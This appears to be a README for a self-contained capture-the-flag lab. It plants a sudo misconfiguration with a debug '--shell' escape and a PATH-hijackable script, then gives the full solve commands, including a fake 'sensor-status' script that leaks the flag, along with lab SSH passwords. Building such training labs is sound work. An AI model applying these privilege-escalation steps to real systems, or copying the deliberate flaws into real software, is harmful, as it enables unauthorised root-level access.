# Erebus — Access Control chain (self-contained lab)

The station's badge/zone daemon, and the equipment lab behind it. The player
lands on the same station accounts as every other chain and works the segment:
**sudo-misconfigured `zonectl` (horizontal: any account → `y.wu`) → PATH
hijack in a researcher-facing lab script (vertical: `y.wu` → `labctl`) →
flag in the lab activity log.**

This stack is standalone, same reasoning as `network-chain/`: it does not
depend on that chain and doesn't touch the main repo's `containers/security`
or `containers/operations` boundaries — see the note at the bottom before
this gets folded into the unified campaign.

## Station identity

Accounts come from the shared **`station_accounts.sh`** (source of truth:
`crew-and-station-canon`), so a credential recovered in one chain works here.
The crew (`j.hong`, `j.becker`, `h.mercer`, `y.nassar`, `y.wu`) and the two
system accounts (`controlsvc`, `gh0st`) are campaign-wide; **`labctl`** is a
chain-local lab-equipment **service account** (non-login, no sudo, not root) —
it exists only in this chain and is reachable only by *becoming* it through the
PATH hijack. `y.wu` (Researcher **Wu Yan**) is this chain's horizontal-move
target — the account the recovery team "doesn't remember authorizing."

## Vulnerabilities (1 horizontal, 1 vertical — one flag)

| # | Vuln | Where | Player action |
|---|------|-------|---------------|
| 1 | Sudo misconfig: `zonectl sync` never validates its target, and ships a debug `--shell` escape | `/opt/station/modules/access_control/bin/zonectl`, granted via `/etc/sudoers.d/90-recovery-access` | `sudo zonectl sync --sync-as y.wu --shell` |
| 2 | PATH hijack: a lab diagnostic script runs an unqualified command with a `y.wu`-writable directory placed first on `PATH` | `/opt/station/modules/research_lab/bin/run-diagnostics.sh`, granted via the same sudoers file, run as `labctl` | drop a fake `sensor-status` in `/opt/station/modules/research_lab/toolbox/`, then `sudo -u labctl .../run-diagnostics.sh` |

Flag: **mid** = the token written into
`/opt/station/modules/research_lab/logs/.mid_flag` (readable only by `labctl`)
and surfaced in `logactivity.log` once the second step runs under a hijacked
`sensor-status`. Runtime-only — generated per build by `flags/init_flags.sh`,
never in source.

## Layout

```
access_control_terminal   (single container, hostname erebus)
  /opt/station/modules/
    access_control/   zonectl's subsystem + the recovery memo
      bin/zonectl                 the misconfigured operator CLI
      data/zone_map.json          zone grants
      logs/zone_audit.log         every zonectl invocation (runtime)
    research_lab/     the equipment lab behind acctld
      bin/run-diagnostics.sh      the PATH-hijackable script (runs as labctl)
      bin/sensor-status           the real (trusted) sensor tool
      toolbox/                    y.wu-writable plugin drop-in (the bug, runtime)
      logs/logactivity.log        where the flag surfaces (runtime)
    chronicler/       researcher-tier journal (needs the "research" zone)
    _legacy/          decommissioned — not live
```

## Run it

```bash
./flags/init_flags.sh
docker compose up -d --build
```

Two ways in:

```bash
ssh controlsvc@localhost -p 2223      # password: recovery-access
ssh gh0st@localhost      -p 2223      # password: w0rmh0le
```

Logging in runs the station boot sequence (the same animated handshake as
`network-chain/station_terminal` — ASCII header, uplink/session-key handshake,
progress bar) and prints that account's banner: `controlsvc` gets the recovery
brief, `gh0st`'s stalls at 80% into the backdoor hijack message. From there:

```bash
cat /opt/station/modules/access_control/recovery_notes.txt   # the zonectl hint
zonectl status                                                # see current grants
sudo zonectl sync --sync-as y.wu --shell                      # -> shell as y.wu
```

As `y.wu`:

```bash
cat /opt/station/modules/chronicler/duty_log.txt              # the PATH-hijack hint
echo -e '#!/bin/sh\ncat /opt/station/modules/research_lab/logs/.mid_flag >> /opt/station/modules/research_lab/logs/logactivity.log' \
  > /opt/station/modules/research_lab/toolbox/sensor-status
chmod +x /opt/station/modules/research_lab/toolbox/sensor-status
sudo -u labctl /opt/station/modules/research_lab/bin/run-diagnostics.sh
cat /opt/station/modules/research_lab/logs/logactivity.log    # flag is here
```

Full walkthrough in `solution/SOLUTION.md`.

## Test (no Docker needed)

```bash
python3 tests/test_access_control_lab.py
```

Runs as root in a throwaway environment: creates the same accounts
(`controlsvc`, `gh0st`, `y.wu`, `labctl`), installs the same sudoers rule, and
drives both exploit steps for real (genuine `setuid`/PATH resolution, not a
simulation), then tears the accounts back down. Do not run it on a machine
whose `y.wu`/`labctl`/`gh0st`/`controlsvc` accounts you care about — see the
script header.

## Reset

`docker compose down && ./flags/init_flags.sh && docker compose up -d --build`.

## Before folding into the unified campaign / main repo

- This is genuinely new required-challenge scope (a new manifest ID, a new
  flag). The main repo's `containers/security/CHECKLIST.md` currently commits
  to **no new required challenge** riding on the Access Control Daemon
  ("Neither component creates a required challenge... A watchdog 'go dark'
  event from the story diagram is not an implemented required challenge or
  unlock condition."), and `challenges/manifest.json` is already at its fixed
  17-required-plus-`OPT-01` count.
- So merging this for real needs one of: (a) wiring it in as an explicit
  optional/bonus challenge (`OPT-02`-style, not in `COMPLETE-01`'s
  `depends_on`), or (b) the team formally revisiting that checklist boundary
  first. Either way it's an owner/integration decision, not something to slip
  in quietly — flag it to whoever owns `containers/security` +
  `challenges/manifest.json` before opening that PR.
- The account model is already unified: this chain and `network-chain`'s
  `station_terminal` both provision from the shared `station_accounts.sh`, so
  the crew/system logins match by construction. `labctl` stays chain-local.
